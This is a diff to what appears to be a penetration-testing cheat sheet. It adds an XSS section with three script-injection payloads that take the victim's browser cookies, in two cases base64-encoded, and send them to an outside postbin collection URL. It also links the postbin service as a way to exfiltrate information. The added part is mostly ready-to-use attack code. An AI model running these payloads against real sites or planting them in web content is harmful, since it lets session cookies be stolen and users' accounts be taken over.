@@ -20,6 +20,7 @@
 - [SQL Injection](#sql-injection)
 - [SSTI](#ssti)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
+- [XSS Injection](#xss-injection)
 
 # BruteForce
 ### Wordlist
@@ -328,6 +329,22 @@ wpscan --force update -e --url IP --disable-tls-checks
 ```
 curl <url> --key KEY.key --cert CERT.cert
 ```
+
+# XSS Injection
+## Script injection
+```html
+<script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
+```
+```html
+<script>document.location = 'https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie);</script>
+```
+```html
+<script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
+```
+
+### Useful Link
+- [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
+- [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
 
 # Server Side XSS
 ## Dynamic PDF
